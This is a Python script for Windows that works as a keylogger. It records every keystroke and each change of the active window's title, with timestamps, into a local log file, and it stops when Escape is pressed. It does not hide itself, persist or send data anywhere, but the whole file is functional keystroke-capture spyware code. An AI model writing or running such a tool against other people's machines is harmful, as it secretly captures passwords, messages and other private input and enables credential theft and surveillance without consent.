from pynput.keyboard import Key, Listener
import os
from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime
import time
from threading import Thread
import pyautogui
import win32api


count = 0
keys = []


if win32api.GetKeyState(0x1B) == 1:
    pyautogui.press('escape')
    
os.chdir(r'C:\MyPythonScripts\keylogger')
def window_change():
    global okno, okno1
    okno = GetWindowText(GetForegroundWindow())
    with open (r'C:\MyPythonScripts\keylogger\log.txt', 'a') as f:
        print (datetime.now(),'\n','*',okno,file=f)
    while True:
        time.sleep(0.2)
        if win32api.GetKeyState(0x1B) == 0:
            okno1 = GetWindowText(GetForegroundWindow())    
            if okno != okno1:
                okno = okno1
                if bool (okno):
                    # print (datetime.now(),GetWindowText(GetForegroundWindow()))
                    with open (r'C:\MyPythonScripts\keylogger\log.txt', 'a') as f:
                        print ('\n','*',okno, file=f)             
        else:
            pyautogui.press('escape')
            break

def on_press(key):
    global keys, count
    keys.append(key)
    count = count + 1
    # print (key)
    
    if count == 1:
        count = 0
        write_file(keys)
        keys = []



def write_file(keys):
    with open(r'C:\MyPythonScripts\keylogger\log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if key == Key.backspace:
                f.write('[del]')
            elif k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        write_file(keys)
        with open(r'C:\MyPythonScripts\keylogger\log.txt', 'a') as f:
            f.write('\n')
        return False

def recording():
    global listener
    with Listener (on_press = on_press, on_release = on_release) as listener:
        listener.join()


if __name__ == '__main__':
    Thread(target=window_change).start()
    Thread(target=recording).start()
